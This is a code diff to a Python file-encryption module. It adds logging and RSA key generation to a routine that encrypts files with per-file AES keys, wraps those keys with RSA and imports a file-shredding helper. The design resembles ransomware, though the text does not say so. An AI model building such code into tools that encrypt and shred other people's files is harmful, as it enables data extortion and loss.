@@ -1,13 +1,18 @@
+import logging
 from .symmetric_encryption import AES
 from .asymmetric_encryption import RSA
 from os import urandom
 from .config import AES_SECRET_KEY_SIZE_IN_BYTES, AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES, ENCRYPTED_FILE_EXTENSION, LOCAL_PUBLIC_KEY, ENCRYPTED_AES_KEY_FILE_LOCATION
-from .utils import read_data_from_file, write_data_to_file, shred_file
+from .utils import read_data_from_file, write_data_to_file, shred_file, generate_rsa_key_pair
 from base64 import b64encode
+
+
+logger = logging.getLogger(__name__)
 
 
 def encrypt_files(file_paths):
     for file_path in file_paths:
+        logger.info(f"Encrypting file: {file_path}")
         aes_secret_key = urandom(AES_SECRET_KEY_SIZE_IN_BYTES)
         aes_initialization_vector = urandom(AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES)
 
@@ -31,6 +36,8 @@ def encrypt_file_details(b64encoded_aes_secret_key, b64encoded_initialization_ve
 
 
 def start_encryption(file_paths):
+    logger.info("Encryption started")
+    LOCAL_PUBLIC_KEY[0] = generate_rsa_key_pair()
     list_of_file_encryption_details = [detail for detail in encrypt_files(file_paths)]
     encrypted_file_encryption_details = [encrypt_file_details(file_encryption_detail[0], file_encryption_detail[1], file_encryption_detail[2]) for file_encryption_detail in list_of_file_encryption_details]
     write_data_to_file(ENCRYPTED_AES_KEY_FILE_LOCATION, encrypted_file_encryption_details, serialized=False)
